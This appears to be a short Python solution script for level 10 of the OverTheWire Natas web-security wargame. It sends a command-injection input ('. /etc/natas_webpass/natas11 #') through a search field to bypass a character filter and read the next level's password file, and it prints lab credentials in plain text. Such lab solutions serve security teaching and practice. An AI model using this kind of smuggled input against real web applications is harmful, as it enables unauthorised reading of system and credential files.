#!/usr/bin/env python3
# request with basic authentication

# vuln: command injection with filtering illegal characters
#  if(preg_match('/[;|&]/',$key)) {

import requests
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = f'http://{username}.natas.labs.overthewire.org/'
#print (url)

session = requests.Session()
response = requests.get(url, auth = (username, password))
# response = requests.post(url, auth = (username, password))
response = session.post(url, data = {"needle": ". /etc/natas_webpass/natas11 #", "submit" : "submit"}, auth=(username, password))


#print (response.text)
print("Password natas11")
print (re.findall("<pre>\n(.*)\n</pre>", response.text)[0])

#password natas11
# U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
